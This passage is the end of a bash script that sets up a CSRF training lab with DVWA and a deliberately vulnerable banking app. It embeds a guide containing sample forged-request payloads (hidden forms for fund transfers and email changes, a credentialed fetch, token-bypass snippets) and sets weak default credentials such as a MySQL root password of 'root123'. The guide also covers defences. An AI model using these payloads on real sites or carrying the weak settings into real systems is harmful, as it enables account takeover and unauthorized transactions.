                    <a href="/secure/csrf_secure_example.php" target="_blank" class="secure-link">Secure Form</a>
                </div>
                <div class="payload-box">
                    <strong>Protection Methods:</strong><br>
                    • CSRF tokens (synchronizer tokens)<br>
                    • SameSite cookie attributes<br>
                    • Referer header validation<br>
                    • Double-submit cookies
                </div>
            </div>
        </div>
        
        <div class="instructions">
            <h3>📋 CSRF Attack Workflow</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-top: 20px;">
                <div style="text-align: center; padding: 20px; background: white; border-radius: 10px;">
                    <h4>1️⃣ Reconnaissance</h4>
                    <p>Identify vulnerable forms and capture legitimate requests using Burp Suite</p>
                </div>
                <div style="text-align: center; padding: 20px; background: white; border-radius: 10px;">
                    <h4>2️⃣ Craft Attack</h4>
                    <p>Create malicious HTML forms that replicate the legitimate requests</p>
                </div>
                <div style="text-align: center; padding: 20px; background: white; border-radius: 10px;">
                    <h4>3️⃣ Social Engineering</h4>
                    <p>Trick authenticated users into visiting the malicious page</p>
                </div>
                <div style="text-align: center; padding: 20px; background: white; border-radius: 10px;">
                    <h4>4️⃣ Execute Attack</h4>
                    <p>Browser automatically submits the form using victim's cookies</p>
                </div>
            </div>
        </div>
        
        <div class="warning">
            <h4>⚠️ Important Security Notes</h4>
            <ul>
                <li><strong>Educational Only:</strong> These vulnerable applications are for learning purposes</li>
                <li><strong>Never deploy in production:</strong> All apps lack proper security controls</li>
                <li><strong>Ethical use:</strong> Only test on systems you own or have permission to test</li>
                <li><strong>Real-world impact:</strong> CSRF attacks can lead to unauthorized transactions, data theft, and account compromise</li>
            </ul>
        </div>
        
        <div style="background: white; padding: 25px; border-radius: 15px; margin-top: 20px;">
            <h3>🎯 Expected Learning Outcomes</h3>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
                <div>
                    <h4>Attack Techniques</h4>
                    <ul>
                        <li>Understanding CSRF vulnerability mechanics</li>
                        <li>Creating malicious HTML forms</li>
                        <li>Social engineering attack vectors</li>
                        <li>Using Burp Suite for request analysis</li>
                        <li>Auto-submitting and hidden form attacks</li>
                    </ul>
                </div>
                <div>
                    <h4>Defense Strategies</h4>
                    <ul>
                        <li>Implementing CSRF tokens properly</li>
                        <li>SameSite cookie configuration</li>
                        <li>Referer header validation</li>
                        <li>Double-submit cookie pattern</li>
                        <li>Framework-specific protections</li>
                    </ul>
                </div>
            </div>
        </div>
        
        <div style="background: #2c3e50; color: white; padding: 25px; border-radius: 15px; margin-top: 20px; text-align: center;">
            <h3>🔐 Lab Database Access</h3>
            <p><strong>MySQL Root:</strong> root123</p>
            <p><strong>DVWA Database:</strong> dvwa</p>
            <p><strong>CSRF Lab Database:</strong> csrf_lab</p>
            <br>
            <p><strong>Ready to start?</strong> Begin with DVWA login, then try the attack pages!</p>
        </div>
    </div>
</body>
</html>
EOF
    
    log_info "CSRF lab dashboard created successfully"
}

configure_apache() {
    log_info "Configuring Apache for CSRF lab..."
    
    # Enable PHP modules
    a2enmod php*
    a2enmod rewrite
    
    # Configure PHP for development
    for php_ini in /etc/php/*/apache2/php.ini; do
        sed -i 's/display_errors = Off/display_errors = On/' "$php_ini"
        sed -i 's/display_startup_errors = Off/display_startup_errors = On/' "$php_ini"
    done
    
    # Set proper permissions
    chown -R www-data:www-data /var/www/html/
    find /var/www/html/ -type d -exec chmod 755 {} \;
    find /var/www/html/ -type f -exec chmod 644 {} \;
    
    # Restart Apache
    systemctl restart apache2
    
    log_info "Apache configured successfully"
}

create_testing_guide() {
    log_info "Creating comprehensive CSRF testing guide..."
    
    cat > /home/$SUDO_USER/CSRF_ATTACK_GUIDE.md << 'EOF'
# CSRF Attack Laboratory - Complete Testing Guide

## Overview
This lab demonstrates Cross-Site Request Forgery (CSRF) attacks and prevention techniques using multiple vulnerable applications and attack vectors.

## What is CSRF?
Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to submit unintended requests to web applications. The attack leverages the trust that a site has in a user's browser.

## Lab Environment Setup Complete
- ✅ DVWA with CSRF module
- ✅ Custom banking application (vulnerable to CSRF)
- ✅ Multiple attack page examples
- ✅ Secure implementation examples
- ✅ Burp Suite integration ready

## Testing Workflow

### Step 1: Understanding CSRF with DVWA
1. **Access DVWA:**
   - URL: `http://localhost/dvwa/`
   - Credentials: `admin / password`
   - Navigate to CSRF section

2. **Capture Legitimate Request:**
   - Change password in CSRF module
   - Use Burp Suite to capture the request:
     ```
     POST /dvwa/vulnerabilities/csrf/ HTTP/1.1
     Host: localhost
     Cookie: PHPSESSID=abcd1234
     
     password_new=newpass&password_conf=newpass&Change=Change
     ```

3. **Create Attack Page:**
   - Visit `/attacker/csrf_password_attack.html`
   - Analyze the malicious form structure
   - Submit to see password change without user consent

### Step 2: Advanced CSRF with Banking App
1. **Login to Banking App:**
   - URL: `http://localhost/csrf_lab/login.php`
   - Credentials: `alice / password123` or `bob / password123`
   - Note the $1000 starting balance

2. **Explore Vulnerable Functions:**
   - Money transfers between users
   - Email address changes
   - No CSRF protection implemented

3. **Execute CSRF Attacks:**
   - Visit `/attacker/csrf_bank_attack.html`
   - Click the "Claim Bonus" button
   - Check bank account - money transferred and email changed

### Step 3: Different Attack Techniques
1. **Auto-Submit Attack:**
   - Visit `/attacker/csrf_auto_attack.html`
   - Page automatically submits CSRF attack after 2 seconds
   - Simulates drive-by attack scenario

2. **Image-Based Attack:**
   - Visit `/attacker/csrf_image_attack.html`
   - Hidden iframe executes CSRF attack
   - Appears as innocent cat gallery

## Burp Suite Analysis

### Intercepting CSRF Requests
1. Configure browser proxy: `127.0.0.1:8080`
2. Enable Burp Proxy intercept
3. Submit forms in vulnerable applications
4. Observe request structure in Burp

### Key Elements to Note:
- **Session cookies:** Automatically included in CSRF attacks
- **POST parameters:** Form data structure
- **No CSRF tokens:** Missing protection mechanisms
- **Referer header:** Often missing or not validated

## CSRF Prevention Analysis

### Visit Secure Example
- URL: `http://localhost/secure/csrf_secure_example.php`
- Observe CSRF token implementation
- Try attacking this form - it will fail

### Protection Mechanisms:
1. **CSRF Tokens:**
   - Unique per session/request
   - Must be included in form
   - Validated on server side

2. **SameSite Cookies:**
   ```
   Set-Cookie: sessionid=abc123; SameSite=Strict
   ```

3. **Referer Validation:**
   ```php
   if (!isset($_SERVER['HTTP_REFERER']) || 
       strpos($_SERVER['HTTP_REFERER'], 'expected-domain.com') !== 0) {
       die('Invalid referer');
   }
   ```

## Attack Scenarios Demonstrated

### 1. Password Change Attack (DVWA)
- **Target:** DVWA password change
- **Method:** Hidden form with social engineering
- **Impact:** Account takeover

### 2. Money Transfer Attack (Banking)
- **Target:** Bank transfer functionality
- **Method:** Malicious bonus claim page
- **Impact:** Unauthorized money transfer

### 3. Email Change Attack (Banking)
- **Target:** Account email update
- **Method:** Combined with money transfer
- **Impact:** Account hijacking preparation

### 4. Auto-Submit Attack
- **Target:** Any vulnerable form
- **Method:** Automatic form submission
- **Impact:** Silent attack execution

## Real-World CSRF Attack Examples

### 1. Social Media
```html
<!-- Malicious post creation -->
<form action="https://social-site.com/post" method="POST">
    <input type="hidden" name="content" value="Spam message">
    <input type="hidden" name="visibility" value="public">
</form>
```

### 2. Email Change
```html
<!-- Account hijacking preparation -->
<form action="https://bank.com/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### 3. Fund Transfer
```html
<!-- Unauthorized money transfer -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
```

## Testing Checklist

### Vulnerability Assessment
- [ ] Check for CSRF tokens in forms
- [ ] Test if tokens are properly validated
- [ ] Verify SameSite cookie attributes
- [ ] Test referer header validation
- [ ] Check for state-changing GET requests

### Attack Testing
- [ ] Create malicious HTML forms
- [ ] Test auto-submission techniques
- [ ] Try iframe-based attacks
- [ ] Test image-based GET requests
- [ ] Verify session riding attacks

### Impact Analysis
- [ ] Document successful attacks
- [ ] Assess business impact
- [ ] Test with different user roles
- [ ] Verify attack prerequisites

## Common CSRF Bypass Techniques

### 1. Token Prediction
```javascript
// If CSRF tokens are predictable
var predictedToken = generatePredictableToken();
document.querySelector('[name="csrf_token"]').value = predictedToken;
```

### 2. Token Leakage
```html
<!-- If tokens are leaked in URLs or logs -->
<img src="https://victim.com/form?csrf_token=leaked123">
```

### 3. Subdomain Attack
```html
<!-- If SameSite=Lax and subdomain is compromised -->
<form action="https://main.victim.com/transfer" method="POST">
<!-- Posted from evil.victim.com -->
```

## Mitigation Strategies

### 1. Synchronizer Token Pattern
```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Validate token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch');
}
```

### 2. Double Submit Cookie
```javascript
// Set CSRF cookie and form field with same value
document.cookie = "csrf_token=" + csrfToken;
document.querySelector('[name="csrf_token"]').value = csrfToken;
```

### 3. SameSite Cookies
```php
// Set SameSite attribute
setcookie('sessionid', $sessionId, [
    'samesite' => 'Strict'  // or 'Lax'
]);
```

## Troubleshooting

### Common Issues
- **CSRF not working:** Check if victim is logged in
- **Form not submitting:** Verify form action URL
- **No impact observed:** Check application logs
- **Burp not capturing:** Verify proxy settings

### Debugging Tips
1. Use browser developer tools to inspect forms
2. Check network tab for request details
3. Verify session cookies are present
4. Test with simplified attack forms first

## Advanced Scenarios

### 1. JSON-based CSRF
```javascript
// CSRF with JSON payload
fetch('/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 1000})
});
```

### 2. Multi-step CSRF
```html
<!-- Chain multiple requests -->
<iframe src="step1.html" onload="loadStep2()"></iframe>
<script>
function loadStep2() {
    document.getElementById('step2').submit();
}
</script>
```

## Lab URLs Quick Reference
- **Main Dashboard:** http://localhost/
- **DVWA CSRF:** http://localhost/dvwa/vulnerabilities/csrf/
- **Banking App:** http://localhost/csrf_lab/login.php
- **Attack Pages:** http://localhost/attacker/
- **Secure Example:** http://localhost/secure/csrf_secure_example.php

## Database Access
- **MySQL root password:** root123
- **DVWA database:** dvwa
- **CSRF lab database:** csrf_lab

---
**Remember:** Always test CSRF attacks in controlled environments only. Never perform these attacks on systems you don't own or lack permission to test.
EOF
    
    chown $SUDO_USER:$SUDO_USER /home/$SUDO_USER/CSRF_ATTACK_GUIDE.md
    log_info "Complete CSRF testing guide created at /home/$SUDO_USER/CSRF_ATTACK_GUIDE.md"
}

check_services() {
    log_info "Checking service status..."
    
    services=("apache2" "mariadb")
    
    for service in "${services[@]}"; do
        if systemctl is-active --quiet "$service"; then
            log_info "✓ $service is running"
        else
            log_warn "✗ $service is not running"
            systemctl start "$service" 2>/dev/null || true
        fi
    done
    
    # Test web server
    if curl -s http://localhost >/dev/null 2>&1; then
        log_info "✓ Web server is accessible"
    else
        log_warn "✗ Web server may not be accessible"
    fi
}

show_completion_message() {
    echo -e "${GREEN}"
    echo "======================================================"
    echo "   🎉 CSRF ATTACK LABORATORY SETUP COMPLETE! 🎉"
    echo "======================================================"
    echo -e "${NC}"
    
    echo "Cross-Site Request Forgery attack lab is ready for testing!"
    echo ""
    echo "📍 **Access Your Lab:**"
    echo "   🏠 Main Dashboard: http://localhost/"
    echo "   🎯 DVWA CSRF: http://localhost/dvwa/"
    echo "   🏦 Banking App: http://localhost/csrf_lab/login.php"
    echo "   🚨 Attack Pages: http://localhost/attacker/"
    echo "   🔒 Secure Example: http://localhost/secure/csrf_secure_example.php"
    echo ""
    echo "🔧 **CSRF Attack Types Covered:**"
    echo "   ✅ Password change attacks (DVWA)"
    echo "   ✅ Money transfer attacks (Banking app)"
    echo "   ✅ Email modification attacks"
    echo "   ✅ Auto-submit CSRF attacks"
    echo "   ✅ Social engineering attacks"
    echo "   ✅ Hidden iframe attacks"
    echo "   ✅ Image-based GET attacks"
    echo ""
    echo "🎯 **Vulnerable Applications:**"
    echo "   • DVWA with CSRF module"
    echo "   • Custom banking application"
    echo "   • Multiple attack vectors"
    echo "   • Prevention examples"
    echo ""
    echo "🔍 **Testing Workflow:**"
    echo "   1. Login to vulnerable applications"
    echo "   2. Capture legitimate requests with Burp Suite"
    echo "   3. Visit malicious attack pages"
    echo "   4. Observe unauthorized actions performed"
    echo "   5. Study prevention techniques"
    echo ""
    echo "🔐 **Credentials:**"
    echo "   • DVWA: admin / password"
    echo "   • Banking: alice / password123, bob / password123"
    echo "   • MySQL root: root123"
    echo ""
    echo "📚 **Documentation:**"
    echo "   • Complete guide: /home/$SUDO_USER/CSRF_ATTACK_GUIDE.md"
    echo "   • Attack techniques and prevention methods included"
    echo ""
    echo "⚠️ **Important Reminders:**"
    echo "   • This is for educational purposes only"
    echo "   • Never use these techniques on systems you don't own"
    echo "   • Always obtain proper authorization before testing"
    echo ""
    echo "🚀 **Get Started:**"
    echo "   1. Configure Burp Suite proxy (127.0.0.1:8080)"
    echo "   2. Visit http://localhost/ to access the lab dashboard"
    echo "   3. Follow the step-by-step testing guide"
    echo ""
    echo "Happy CSRF Testing! 🔍🛡️"
    echo ""
    echo "Begin your journey: http://localhost/"
}

main() {
    print_banner
    check_root
    detect_os
    
    log_info "Starting CSRF attack laboratory setup..."
    
    update_system
    install_lamp_stack
    configure_mysql
    setup_dvwa
    create_csrf_attack_pages
    create_vulnerable_csrf_app
    create_csrf_prevention_examples
    create_main_dashboard
    configure_apache
    create_testing_guide
    
    check_services
    show_completion_message
}

# Run main function
main "$@"
